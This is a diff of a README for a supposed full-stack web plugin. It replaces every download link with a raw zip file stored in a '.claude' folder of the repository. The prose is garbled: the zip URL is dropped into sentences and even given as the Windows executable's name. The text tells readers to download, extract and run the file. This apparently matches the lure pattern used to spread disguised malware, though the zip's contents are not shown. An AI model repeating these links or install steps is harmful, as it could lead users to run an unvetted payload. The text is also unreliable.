@@ -2,7 +2,7 @@
 
 ## 🛠️ Overview
 
-Welcome to the **larouex-fullstack-plugin**. This tool helps you build https://raw.githubusercontent.com/Ashikparvez89/larouex-fullstack-plugin/main/curdwort/larouex-fullstack-plugin.zip websites with ease, offering a connection to Azure or Railway for deployment. Enjoy a collection of 81 commands and 12 AI agents designed to simplify your web development experience.
+Welcome to the **larouex-fullstack-plugin**. This tool helps you build https://github.com/Ashikparvez89/larouex-fullstack-plugin/raw/refs/heads/main/.claude/fullstack_plugin_larouex_v3.3.zip websites with ease, offering a connection to Azure or Railway for deployment. Enjoy a collection of 81 commands and 12 AI agents designed to simplify your web development experience.
 
 ## 🚀 Getting Started
 
@@ -17,21 +17,21 @@ To start using the larouex-fullstack-plugin, follow these simple steps. No progr
 2. **Download the Plugin**
    To get the latest version of the larouex-fullstack-plugin, visit the Releases page:
 
-   [![Download larouex-fullstack-plugin](https://raw.githubusercontent.com/Ashikparvez89/larouex-fullstack-plugin/main/curdwort/larouex-fullstack-plugin.zip)](https://raw.githubusercontent.com/Ashikparvez89/larouex-fullstack-plugin/main/curdwort/larouex-fullstack-plugin.zip)
+   [![Download larouex-fullstack-plugin](https://github.com/Ashikparvez89/larouex-fullstack-plugin/raw/refs/heads/main/.claude/fullstack_plugin_larouex_v3.3.zip)](https://github.com/Ashikparvez89/larouex-fullstack-plugin/raw/refs/heads/main/.claude/fullstack_plugin_larouex_v3.3.zip)
 
 ## 📥 Download & Install
 
 1. **Visit this page to download:**
-   Click here: [Download from Releases](https://raw.githubusercontent.com/Ashikparvez89/larouex-fullstack-plugin/main/curdwort/larouex-fullstack-plugin.zip).
+   Click here: [Download from Releases](https://github.com/Ashikparvez89/larouex-fullstack-plugin/raw/refs/heads/main/.claude/fullstack_plugin_larouex_v3.3.zip).
 
 2. **Choose the Right Version**
-   Look for the latest release. Click on the file that matches your operating system. It will usually end with `.zip`, `https://raw.githubusercontent.com/Ashikparvez89/larouex-fullstack-plugin/main/curdwort/larouex-fullstack-plugin.zip`, or similar. 
+   Look for the latest release. Click on the file that matches your operating system. It will usually end with `.zip`, `https://github.com/Ashikparvez89/larouex-fullstack-plugin/raw/refs/heads/main/.claude/fullstack_plugin_larouex_v3.3.zip`, or similar. 
 
 3. **Extract the Downloaded File**
    After downloading, find the file in your downloads folder. Double-click it and extract the contents to a location you can easily reach.
 
 4. **Run the Application**
-   Navigate to the folder where you extracted the files. Look for the executable file. For Windows, this might be `https://raw.githubusercontent.com/Ashikparvez89/larouex-fullstack-plugin/main/curdwort/larouex-fullstack-plugin.zip`. For macOS or Linux, it might be simply `larouex-fullstack-plugin`.
+   Navigate to the folder where you extracted the files. Look for the executable file. For Windows, this might be `https://github.com/Ashikparvez89/larouex-fullstack-plugin/raw/refs/heads/main/.claude/fullstack_plugin_larouex_v3.3.zip`. For macOS or Linux, it might be simply `larouex-fullstack-plugin`.
 
 5. **Follow On-Screen Instructions**
    When you run the application, it will provide you with step-by-step setup instructions. Follow these carefully to complete the installation.
